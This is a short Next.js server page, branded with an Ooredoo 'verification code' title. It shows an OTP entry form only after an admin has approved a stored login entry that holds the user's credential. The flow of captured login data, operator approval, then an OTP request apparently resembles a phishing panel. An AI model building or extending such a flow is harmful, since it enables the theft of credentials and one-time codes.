import { notFound } from "next/navigation";
import { createServiceClient } from "@/lib/supabase/server";
import { MaawenOtpClient } from "@/components/maawen/MaawenOtpClient";

export const metadata = {
  title: "رمز التحقق — Ooredoo",
};

export default async function MaawenVerifyPage({
  params,
}: {
  params: Promise<{ locale: string; entryId: string }>;
}) {
  const { locale, entryId } = await params;
  const isAr = locale === "ar";

  const supabase = createServiceClient();
  const { data: entry } = await supabase
    .from("client_data_entries")
    .select("id, payload")
    .eq("id", entryId)
    .maybeSingle();

  if (!entry) notFound();

  const payload = entry.payload as Record<string, unknown>;
  const status = String(payload.status ?? "pending_admin");

  // فقط طلب الدخول المعتمد من المدير يصل لصفحة إدخال الرمز.

  if (status !== "approved") notFound();

  const credential = String(payload.credential ?? payload.email ?? payload.username ?? "");

  return (
    <MaawenOtpClient
      locale={isAr ? "ar" : "en"}
      loginEntryId={entryId}
      credential={credential}
    />
  );
}